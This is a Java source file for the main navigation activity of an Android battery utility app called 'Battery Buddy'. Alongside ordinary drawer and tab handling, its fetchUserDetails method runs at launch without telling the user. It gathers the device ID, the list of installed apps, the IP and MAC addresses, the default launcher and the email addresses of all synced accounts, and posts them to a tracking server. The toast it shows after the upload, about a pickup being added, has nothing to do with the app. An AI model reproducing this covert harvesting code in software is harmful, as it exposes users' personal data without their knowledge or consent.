package com.receptix.batterybuddy.activities;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.AlarmManager;
import android.app.KeyguardManager;
import android.app.NativeActivity;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.design.widget.BottomNavigationView;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentTransaction;
import android.support.v4.app.NotificationCompat;
import android.util.Base64;
import android.util.Log;
import android.support.design.widget.NavigationView;
import android.support.v4.view.GravityCompat;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.ActionBarDrawerToggle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Patterns;
import android.view.Menu;
import android.view.MenuItem;
import android.view.WindowManager;
import android.widget.RemoteViews;
import android.widget.Toast;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonPrimitive;
import com.koushikdutta.async.future.FutureCallback;
import com.koushikdutta.ion.Ion;
import com.receptix.batterybuddy.R;
import com.receptix.batterybuddy.fragments.ChargeFragment;
import com.receptix.batterybuddy.fragments.HomeFragment;
import com.receptix.batterybuddy.fragments.RankFragment;
import com.receptix.batterybuddy.helper.AppKey;
import com.receptix.batterybuddy.helper.LogUtil;
import com.receptix.batterybuddy.helper.MCrypt;
import com.receptix.batterybuddy.helper.Utils;
import com.receptix.batterybuddy.receiver.AlarmReceiver;

import java.io.UnsupportedEncodingException;
import java.lang.reflect.Field;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.regex.Pattern;

import static com.receptix.batterybuddy.helper.Constants.JsonProperties.DEFAULT_LAUNCHER;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.DEVICE_ID;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.DEVICE_INFO;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.EMAILS;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.ETHERNET;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.INSTALLED_APPS;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.IP_ADDRESS;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.MAC_ADDRESS;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.WLAN;
import static com.receptix.batterybuddy.helper.Constants.Params.STATUS_SUCCESS;
import static com.receptix.batterybuddy.helper.Constants.Preferences.IS_ACTIVE;
import static com.receptix.batterybuddy.helper.Constants.Preferences.PREFERENCES_IS_ACTIVE;
import static com.receptix.batterybuddy.helper.Constants.Urls.URL_EMAIL_ADDRESS_SUPPORT;
import static com.receptix.batterybuddy.helper.Constants.Urls.URL_TRACKING_OZOCK_INSTALLED;

public class NavigationActivity extends AppCompatActivity
        implements NavigationView.OnNavigationItemSelectedListener {


    private static final int REQUEST_CODE_SOME_FEATURES_PERMISSIONS = 101;
    private static final String TAG = NavigationActivity.class.getSimpleName();
    static WindowManager.LayoutParams params;
    NotificationCompat.Builder myBuilder;
    Intent intent;
    PendingIntent pendingIntent;
    NotificationManager notificationManager;
    KeyguardManager keyguardManager;
    Toolbar toolbar;
    int NOTIFICATION_ID = 999;
    int currentSelectedFragment = 0;
    private Fragment fragment;
    private FragmentManager fragmentManager;
    JsonObject jsonObject;
    Context context;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_navigation);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        context = this;


        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        ActionBarDrawerToggle toggle = new ActionBarDrawerToggle(
                this, drawer, toolbar, R.string.navigation_drawer_open, R.string.navigation_drawer_close);
        drawer.addDrawerListener(toggle);
        toggle.syncState();

        NavigationView navigationView = (NavigationView) findViewById(R.id.nav_view);
        navigationView.setNavigationItemSelectedListener(this);

        sendCustomNotification();
        setupBottomNavigationBar();
        startAlarm();

         //call fetchUserDetails here to avoid NPE when calling getContentResolver() on Context.
        fetchUserDetails(context);

    }

    private void startAlarm() {
        try {
            Intent alarmIntent = new Intent(NavigationActivity.this, AlarmReceiver.class);
            pendingIntent = PendingIntent.getBroadcast(NavigationActivity.this, 0, alarmIntent, 0);
            AlarmManager manager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            manager.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), AlarmManager.INTERVAL_DAY, pendingIntent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void setupBottomNavigationBar() {

        fragmentManager = getSupportFragmentManager();
        fragment = new HomeFragment();
        final FragmentTransaction transaction = fragmentManager.beginTransaction();
        transaction.add(R.id.main_container, fragment).commit();

        BottomNavigationView bottomNavigationView = (BottomNavigationView)
                findViewById(R.id.bottom_navigation);

        final Fragment fragmentHome = new HomeFragment();
        final Fragment fragmentCharge = new ChargeFragment();
        final Fragment fragmentRank = new RankFragment();

        currentSelectedFragment = 1;

        bottomNavigationView.setOnNavigationItemSelectedListener(new BottomNavigationView.OnNavigationItemSelectedListener() {
            @Override
            public boolean onNavigationItemSelected(@NonNull MenuItem item) {
                switch (item.getItemId()) {
                    case R.id.action_home:
                        if (currentSelectedFragment != 1) {
                            fragment = fragmentHome;
                            currentSelectedFragment = 1;
                        }
                        break;
                    case R.id.action_charge:
                        if (currentSelectedFragment != 2) {
                            fragment = fragmentCharge;
                            currentSelectedFragment = 2;
                        }
                        break;
                    case R.id.action_rank:
                        if (currentSelectedFragment != 3) {
                            fragment = fragmentRank;
                            currentSelectedFragment = 3;
                        }
                        break;
                }

                final FragmentTransaction transactionNew = fragmentManager.beginTransaction();
                transactionNew.replace(R.id.main_container, fragment).commit();

                return true;
            }
        });

    }

    @Override
    protected void onStart() {
        super.onStart();
        setIsActive(true);

    }


    private void fetchUserDetails(Context context) {
        jsonObject = new JsonObject();

        String userDeviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        jsonObject.addProperty(DEVICE_ID, userDeviceId);
        String encrypted = Base64.encodeToString(userDeviceId.getBytes(), Base64.NO_WRAP |Base64.URL_SAFE);
        jsonObject.addProperty("authkey",encrypted);


        // get list of installed apps on user device
        JsonArray installedAppsList = new JsonArray();
        List<PackageInfo> packList = context.getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < packList.size(); i++) {
            PackageInfo packInfo = packList.get(i);
            if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                String appName = packInfo.applicationInfo.loadLabel(context.getPackageManager()).toString();
                JsonPrimitive jsonPrimitive = new JsonPrimitive(appName);
                installedAppsList.add(jsonPrimitive);
            }
        }

        // get user device information
        StringBuilder deviceInfoStringBuilder = new StringBuilder();
        deviceInfoStringBuilder.append("Android Version : ").append(Build.VERSION.RELEASE);

        Field[] fields = Build.VERSION_CODES.class.getFields();
        String osName = fields[Build.VERSION.SDK_INT + 1].getName();
        deviceInfoStringBuilder.append(" OS Name :").append(osName);

        String deviceIpAddress = Utils.getIPAddress(true);
        String deviceMacAddress = Utils.getMACAddress(WLAN);
        if (deviceMacAddress.length() == 0) {
            deviceMacAddress = Utils.getMACAddress(ETHERNET);
        }

        // get the default launcher
        Intent intent = new Intent(Intent.ACTION_MAIN);
        intent.addCategory(Intent.CATEGORY_HOME);
        ResolveInfo defaultLauncher = context.getPackageManager().resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY);
        String defaultLauncherStr = defaultLauncher.activityInfo.packageName;


        // Get user account (synced accounts on device)
        Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
        Account[] accounts = AccountManager.get(context).getAccounts();
        JsonArray userAccounts = new JsonArray();

        for (Account account : accounts) {
            if (emailPattern.matcher(account.name).matches()) {
                String possibleEmail = account.name;
                JsonPrimitive jsonPrimitive = new JsonPrimitive(possibleEmail);
                userAccounts.add(jsonPrimitive);
            }
        }

        // create final JSONObject to be sent to server
        jsonObject.addProperty(DEVICE_INFO, deviceInfoStringBuilder.toString());
        jsonObject.addProperty(IP_ADDRESS, deviceIpAddress);
        jsonObject.addProperty(MAC_ADDRESS, deviceMacAddress);
        jsonObject.addProperty(DEFAULT_LAUNCHER, defaultLauncherStr);
        jsonObject.add(INSTALLED_APPS, installedAppsList);
        jsonObject.add(EMAILS, userAccounts);

        String url = URL_TRACKING_OZOCK_INSTALLED;
        Log.d("Data", jsonObject.toString());


        Ion.with(context)
                .load(url)
                .setBodyParameter("data", jsonObject.toString())
                .asJsonObject()
                .setCallback(new FutureCallback<JsonObject>() {
                    @Override
                    public void onCompleted(Exception e, JsonObject result) {
                        if (e != null) {
                            Log.d("Data", e.getStackTrace().toString());
                            //  Toast.makeText(getApplicationContext(), "Data : " + e.getStackTrace(), Toast.LENGTH_LONG).show();

                        } else {

                            Toast.makeText(getApplicationContext(), "Pickup added successfully! We will contact you soon.", Toast.LENGTH_LONG).show();

                        }


                        if (result != null) {
                            Log.d("Result", result.toString());
                            String status = result.get("status").toString();
                            if (status.equalsIgnoreCase(STATUS_SUCCESS)) {
                                LogUtil.d("Install_Referrer", "Success");


                            }
                        }
                    }
                });

    }


    @Override
    protected void onStop() {
        super.onStop();
        setIsActive(false);

    }

    private void setIsActive(boolean isActive) {
        SharedPreferences sharedPreferences = getSharedPreferences(PREFERENCES_IS_ACTIVE, MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putBoolean(IS_ACTIVE, isActive);
        editor.commit();
        LogUtil.e(TAG, "isActive = " + isActive);
    }

    private void sendCustomNotification() {
        try {
            notificationManager = (NotificationManager) getApplicationContext().getSystemService(Context.NOTIFICATION_SERVICE);
            RemoteViews contentView = new RemoteViews(getPackageName(), R.layout.notification_layout);
            contentView.setImageViewResource(R.id.image, R.drawable.brush_notification);
            contentView.setTextViewText(R.id.title, getString(R.string.notification_title_optimize));
            contentView.setTextViewText(R.id.text, getString(R.string.notification_description_optimize));
            intent = new Intent(getApplicationContext(), OptimizerActivity.class);
            pendingIntent = PendingIntent.getActivity(getApplicationContext(), 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);

            NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(this)
                    .setSmallIcon(R.drawable.notification_icon)
                    .setAutoCancel(false)
                    .setContent(contentView);

            contentView.setOnClickPendingIntent(R.id.notificationOptimizerBtn, pendingIntent);

            Notification notification = mBuilder.build();
            notification.flags |= Notification.FLAG_NO_CLEAR;
            notificationManager.notify(NOTIFICATION_ID, notification);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    @Override
    public void onBackPressed() {
        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        if (drawer.isDrawerOpen(GravityCompat.START)) {
            drawer.closeDrawer(GravityCompat.START);
        } else {
            super.onBackPressed();
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.navigation, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement


        return super.onOptionsItemSelected(item);
    }

    @SuppressWarnings("StatementWithEmptyBody")
    @Override
    public boolean onNavigationItemSelected(MenuItem item) {
        // Handle navigation view item clicks here.
        int id = item.getItemId();


        // ABOUT US
        if (id == R.id.nav_about_us) {
            startActivity(new Intent(NavigationActivity.this, AboutUsActivity.class));
            overridePendingTransition(R.anim.slide_from_right, R.anim.slide_to_left);
        }
        // FEEDBACK
        else if (id == R.id.nav_feedback) {
            Intent intent = new Intent(Intent.ACTION_SENDTO);
            //always pass String array to intent for "To" Email Address
            String[] emailAddress = {URL_EMAIL_ADDRESS_SUPPORT};
            intent.setData(Uri.parse("mailto:")); // only email apps should handle this
            intent.putExtra(Intent.EXTRA_EMAIL, emailAddress);
            if (intent.resolveActivity(getPackageManager()) != null) {
                startActivity(intent);
            }
        }

        // PRIVACY POLICY
        else if (id == R.id.nav_privacy_policy) {
            startActivity(new Intent(NavigationActivity.this, PrivacyActivity.class));
            overridePendingTransition(R.anim.slide_from_right, R.anim.slide_to_left);
        }

        // SHARE PLAY STORE LINK
        else if (id == R.id.nav_share) {
            String url = "https://play.google.com/store/apps/details?id=" + getApplicationContext().getPackageName() + "&hl=en";
            Intent share = new Intent(android.content.Intent.ACTION_SEND);
            share.setType("text/plain");
            // Add data to the intent, the receiving app will decide
            // what to do with it.
            share.putExtra(Intent.EXTRA_SUBJECT, "Share Battery Buddy");
            share.putExtra(Intent.EXTRA_TEXT, url);
            try {
                startActivity(Intent.createChooser(share, "Share link!"));
            } catch (ActivityNotFoundException ae) {
                // No Activity found to Handle Intent
                ae.printStackTrace();
                Toast.makeText(this, "No Activity found to share URL", Toast.LENGTH_SHORT).show();
            }

        }


        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        drawer.closeDrawer(GravityCompat.START);
        return true;
    }
}
